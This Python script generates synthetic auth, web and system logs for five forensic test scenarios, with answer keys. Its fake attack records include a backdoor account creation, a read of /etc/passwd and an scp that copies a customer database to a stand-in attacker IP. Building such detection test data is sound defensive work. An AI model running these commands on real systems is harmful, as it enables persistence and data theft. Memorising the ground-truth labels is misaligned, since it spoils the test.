"""Generate the TC-01 dataset: one cross-source attack hidden in a night of normal activity.

All data is fictional. External IPs come from the RFC 5737 documentation ranges
(203.0.113.0/24 and 198.51.100.0/24), so they can never belong to a real host.

Run:  python scripts/generate_synthetic_logs.py
Writes data/tc01_attack/{auth.csv, web_access.json, system.csv, dataset.json, ground_truth.json}
"""
import csv
import json
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

SEED = 42
DAY = datetime(2026, 10, 20, tzinfo=timezone.utc)
ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "data" / "tc01_attack"
sys.path.insert(0, str(ROOT))
from tracex.custody import seal  # noqa: E402

ATTACKER_IP = "203.0.113.45"
SCANNER_IP = "198.51.100.77"
VICTIM = "jsmith"
USERS = {"alice": "10.0.1.11", "bob": "10.0.1.12", "carol": "10.0.1.13", "dave": "10.0.1.14", "jsmith": "10.0.1.15"}
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36"
ATTACK_UA = "python-requests/2.31.0"
SCANNER_UA = "Mozilla/5.0 zgrab/0.x"
NORMAL_PATHS = ["/dashboard", "/reports", "/api/orders", "/api/orders/{n}", "/profile", "/static/app.js"]

AUTH_FIELDS = ["time", "username", "source_ip", "target_host", "method", "result", "session"]
SYSTEM_FIELDS = ["Timestamp", "Host", "Account", "PID", "Process", "CommandLine"]


def at(hour, minute, second=0):
    return DAY + timedelta(hours=hour, minutes=minute, seconds=second)


# Each source writes time differently, on purpose: normalizing them is part of the job.
def auth_ts(t):
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")             # 2026-10-20T02:14:30Z


def web_ts(t):
    return t.strftime("%d/%b/%Y:%H:%M:%S +0000")        # 20/Oct/2026:02:15:10 +0000


def sys_ts(t):
    return t.strftime("%b %d %H:%M:%S")                 # Oct 20 02:18:05 (syslog: no year)


def auth_row(t, user, ip, host, method, result, session="", attack=False):
    return {"_t": t, "_attack": attack, "time": auth_ts(t), "username": user, "source_ip": ip,
            "target_host": host, "method": method, "result": result, "session": session}


def web_row(t, ip, user, verb, path, status, size, ua, sid, attack=False):
    return {"_t": t, "_attack": attack, "ts": web_ts(t), "client": ip, "user": user, "verb": verb,
            "path": path, "status": status, "bytes": size, "user_agent": ua, "sid": sid}


def sys_row(rng, t, account, process, cmd, attack=False):
    return {"_t": t, "_attack": attack, "Timestamp": sys_ts(t), "Host": "web-01", "Account": account,
            "PID": rng.randint(2000, 32000), "Process": process, "CommandLine": cmd}


def portal_session(rng, user, start, auth, web, typo=False):
    """A normal user logs in to the portal and browses for a while."""
    t = start
    if typo:  # a single mistyped password is normal, not an attack
        auth.append(auth_row(t, user, USERS[user], "portal", "web", "failure"))
        t += timedelta(seconds=9)
    sid = f"sess-{rng.randrange(16 ** 6):06x}"
    auth.append(auth_row(t, user, USERS[user], "portal", "web", "success", sid))
    for _ in range(rng.randint(6, 12)):
        t += timedelta(seconds=rng.randint(20, 300))
        path = rng.choice(NORMAL_PATHS).format(n=rng.randint(1000, 9999))
        web.append(web_row(t, USERS[user], user, "GET", path, 200, rng.randint(800, 40000), BROWSER_UA, sid))


def normal_activity(rng, auth, web, system):
    portal_session(rng, "carol", at(0, 40), auth, web)            # night shift
    portal_session(rng, "carol", at(4, 5), auth, web)
    for user in ["alice", "bob", "dave", "jsmith"]:               # day shift arrives 07:30-09:30
        start = at(7, 30) + timedelta(minutes=rng.randint(0, 120))
        portal_session(rng, user, start, auth, web, typo=(user == "bob"))

    for hour in range(0, 10, 2):                                   # nightly backup job
        system.append(sys_row(rng, at(hour, 0, 2), "root", "cron", "/usr/local/bin/backup.sh --db customers"))

    t = at(8, 45)                                                  # admin does routine maintenance
    auth.append(auth_row(t, "alice", USERS["alice"], "web-01", "ssh", "success", "ssh-3107"))
    for process, cmd in [("systemctl", "systemctl status nginx"),
                         ("tail", "tail -n 50 /var/log/nginx/error.log"),
                         ("git", "git -C /srv/portal pull")]:
        t += timedelta(seconds=rng.randint(30, 120))
        system.append(sys_row(rng, t, "alice", process, cmd))

    t = at(3, 30)                                                  # unrelated internet scanner (decoy)
    for path in ["/wp-login.php", "/.env", "/phpmyadmin/", "/admin"]:
        t += timedelta(seconds=rng.randint(1, 4))
        web.append(web_row(t, SCANNER_IP, "-", "GET", path, 404 if path != "/admin" else 302,
                           rng.randint(150, 400), SCANNER_UA, ""))


def attack_activity(rng, auth, web, system):
    t = at(2, 10, 5)
    for _ in range(14):                                            # password guessing on the portal
        auth.append(auth_row(t, VICTIM, ATTACKER_IP, "portal", "web", "failure", attack=True))
        t += timedelta(seconds=rng.randint(6, 15))
    sid = "sess-a71c3e"
    auth.append(auth_row(t, VICTIM, ATTACKER_IP, "portal", "web", "success", sid, attack=True))

    for path, size in [("/dashboard", 18233), ("/admin", 9120), ("/admin/users", 15402),
                       ("/admin/export?table=customers", 4812330)]:
        t += timedelta(seconds=rng.randint(20, 60))
        web.append(web_row(t, ATTACKER_IP, VICTIM, "GET", path, 200, size, ATTACK_UA, sid, attack=True))

    t += timedelta(seconds=90)                                     # same password reused for SSH
    auth.append(auth_row(t, VICTIM, ATTACKER_IP, "web-01", "ssh", "success", "ssh-5521", attack=True))
    for process, cmd in [("whoami", "whoami"),
                         ("id", "id"),
                         ("cat", "cat /etc/passwd"),
                         ("ls", "ls -la /var/backups"),
                         ("sudo", "sudo useradd -m -s /bin/bash backup_svc"),
                         ("crontab", "crontab -l"),
                         ("scp", f"scp /var/backups/customers.sql backup@{ATTACKER_IP}:/tmp/")]:
        t += timedelta(seconds=rng.randint(20, 70))
        system.append(sys_row(rng, t, VICTIM, process, cmd, attack=True))


def finish(rows):
    """Sort by time and drop the generator-only keys."""
    rows.sort(key=lambda r: r["_t"])
    return rows


TC01_TECHNIQUES = {
    "T1110.001": "Brute Force: Password Guessing",
    "T1078": "Valid Accounts",
    "T1021.004": "Remote Services: SSH",
    "T1033": "System Owner/User Discovery",
    "T1087.001": "Account Discovery: Local Account",
    "T1083": "File and Directory Discovery",
    "T1136.001": "Create Account: Local Account",
    "T1048": "Exfiltration Over Alternative Protocol",
}
TC01_ENTITIES = {"attacker_ip": ATTACKER_IP, "compromised_user": VICTIM, "affected_host": "web-01",
                 "attacker_session": "sess-a71c3e", "created_account": "backup_svc",
                 "exfiltrated_file": "/var/backups/customers.sql"}


def add_malformed(auth, web):
    """Deliberately malformed records, so validation has something real to catch."""
    auth.insert(len(auth) // 2, {"_attack": False, "time": "", "username": "dave", "source_ip": USERS["dave"],
                                 "target_host": "portal", "method": "web", "result": "success", "session": ""})
    auth.insert(len(auth) - 3, {"_attack": False, "time": "2026-13-45T99:00:00Z", "username": "bob",
                                "source_ip": USERS["bob"], "target_host": "portal", "method": "web",
                                "result": "failure", "session": ""})
    web.insert(len(web) // 3, {"_attack": False, "client": USERS["alice"], "user": "alice", "verb": "GET",
                               "path": "/reports", "status": 200, "bytes": 5120, "user_agent": BROWSER_UA,
                               "sid": ""})  # no "ts" field at all


def write_scenario(folder, meta, truth_extra, auth, web, system=None):
    """Write one scenario folder. `system=None` leaves the system log out entirely (TC-03).

    Ground truth uses the same raw_ref format as the parsers: CSV line number (header = line 1)
    or JSON record index.
    """
    out = OUT.parent / folder
    out.mkdir(parents=True, exist_ok=True)
    truth = {
        "auth": [f"auth.csv:{i + 2}" for i, r in enumerate(auth) if r["_attack"]],
        "web": [f"web_access.json#{i}" for i, r in enumerate(web) if r["_attack"]],
    }
    if system is not None:
        truth["system"] = [f"system.csv:{i + 2}" for i, r in enumerate(system) if r["_attack"]]

    strip = lambda r: {k: v for k, v in r.items() if not k.startswith("_")}
    with open(out / "auth.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=AUTH_FIELDS)
        w.writeheader()
        w.writerows(strip(r) for r in auth)
    with open(out / "web_access.json", "w", encoding="utf-8") as f:
        json.dump([strip(r) for r in web], f, indent=1)
    if system is not None:
        with open(out / "system.csv", "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=SYSTEM_FIELDS)
            w.writeheader()
            w.writerows(strip(r) for r in system)
    elif (out / "system.csv").exists():
        (out / "system.csv").unlink()

    (out / "dataset.json").write_text(json.dumps({**meta, "syslog_year": DAY.year}, indent=2), encoding="utf-8")
    (out / "ground_truth.json").write_text(json.dumps({"attack_events": truth, **truth_extra}, indent=2),
                                           encoding="utf-8")
    # Seal the evidence at "collection" time: hashes of every file and record (see tracex/custody.py).
    seal(out, sealed_at="2026-10-20T10:00:00Z", sealed_by="TraceX synthetic evidence generator")
    counts = {"auth": len(auth), "web": len(web), "system": len(system) if system is not None else 0}
    print(f"Wrote {out.name:16} records: {counts}  attack events: { {k: len(v) for k, v in truth.items()} }")


def base_rows(with_attack=True):
    """Normal day (+ the TC-01 attack). A fresh RNG per scenario keeps TC-01 identical across runs."""
    rng = random.Random(SEED)
    auth, web, system = [], [], []
    normal_activity(rng, auth, web, system)
    if with_attack:
        attack_activity(rng, auth, web, system)
    return finish(auth), finish(web), finish(system)


def tc01():
    auth, web, system = base_rows()
    add_malformed(auth, web)
    write_scenario("tc01_attack", {
        "name": "TC-01: Successful attack sequence",
        "description": "Password guessing against the portal, admin data export, SSH reuse of the "
                       "stolen password, discovery, local account creation and exfiltration over scp, "
                       "hidden among normal staff activity, a backup cron job and an unrelated scanner.",
    }, {"expected_incidents": 1, "entities": TC01_ENTITIES,
        "not_attack": {"scanner_ip": SCANNER_IP, "benign_failed_login_user": "bob"},
        "expected_gaps": ["untimed"],   # the three deliberately malformed rows
        "expected_techniques": TC01_TECHNIQUES}, auth, web, system)


def tc02():
    auth, web, system = base_rows(with_attack=False)
    write_scenario("tc02_benign", {
        "name": "TC-02: Benign activity",
        "description": "A normal night and morning: staff logins (one mistyped password), portal browsing, "
                       "an admin maintenance session, the backup cron job and an internet scanner. No compromise.",
    }, {"expected_incidents": 0, "expected_techniques": {}}, auth, web, system)


def tc03():
    auth, web, _ = base_rows()
    write_scenario("tc03_incomplete", {
        "name": "TC-03: Incomplete evidence",
        "description": "The TC-01 attack, but the system log from web-01 was never collected. The SSH login is "
                       "visible; what happened on the host afterwards is not.",
    }, {"expected_incidents": 1, "entities": {k: v for k, v in TC01_ENTITIES.items()
                                               if k in ("attacker_ip", "compromised_user", "attacker_session")},
        "expected_gaps": ["missing_source:system", "unverified_host:web-01"],
        "expected_techniques": {k: TC01_TECHNIQUES[k] for k in ("T1110.001", "T1078", "T1021.004")}},
        auth, web, None)


def tc04():
    auth, web, system = base_rows()
    for r in system:  # web-01's clock runs 5 minutes behind the SSO server
        r["_t"] = r["_t"] - timedelta(minutes=5)
        r["Timestamp"] = sys_ts(r["_t"])
    for r in web:     # the web server logs in local time (IST, +05:30): valid, but a different format
        r["ts"] = (r["_t"] + timedelta(hours=5, minutes=30)).strftime("%d/%b/%Y:%H:%M:%S +0530")
    i = len(web) // 2  # two benign rows written out of order
    web[i], web[i + 1] = web[i + 1], web[i]
    write_scenario("tc04_clock_skew", {
        "name": "TC-04: Timestamp inconsistency",
        "description": "The TC-01 attack with a web log in IST (+05:30), the web-01 system clock 5 minutes "
                       "behind the SSO server, and two web rows written out of order.",
    }, {"expected_incidents": 1, "entities": TC01_ENTITIES, "clock_offset_minutes": {"system": -5},
        "expected_gaps": ["clock_skew:system"], "expected_techniques": TC01_TECHNIQUES}, auth, web, system)


def tc05():
    rng = random.Random(SEED + 5)
    auth, web, system = base_rows()
    # Decoy 1: another external address, one number away from the attacker, guessing "admin" and failing.
    t = at(2, 11, 0)
    for _ in range(6):
        auth.append(auth_row(t, "admin", "203.0.113.46", "portal", "web", "failure"))
        t += timedelta(seconds=rng.randint(5, 12))
    # Decoy 2: carol, travelling, logs in from a hotel address during the same minutes and works normally.
    t = at(2, 15, 30)
    auth.append(auth_row(t, "carol", "198.51.100.23", "portal", "web", "success", "sess-c4r01e"))
    for path in ["/dashboard", "/reports", "/api/orders"]:
        t += timedelta(seconds=rng.randint(30, 90))
        web.append(web_row(t, "198.51.100.23", "carol", "GET", path, 200, rng.randint(800, 40000), BROWSER_UA,
                           "sess-c4r01e"))
    auth, web = finish(auth), finish(web)
    write_scenario("tc05_unrelated", {
        "name": "TC-05: Unrelated events",
        "description": "The TC-01 attack plus look-alike activity in the same minutes: a neighbouring external IP "
                       "guessing 'admin' without success, and a travelling employee logging in from a hotel.",
    }, {"expected_incidents": 1, "entities": TC01_ENTITIES,
        "not_attack": {"neighbour_ip": "203.0.113.46", "traveller": "carol@198.51.100.23"},
        "expected_techniques": TC01_TECHNIQUES}, auth, web, system)


def main():
    for build in (tc01, tc02, tc03, tc04, tc05):
        build()


if __name__ == "__main__":
    main()
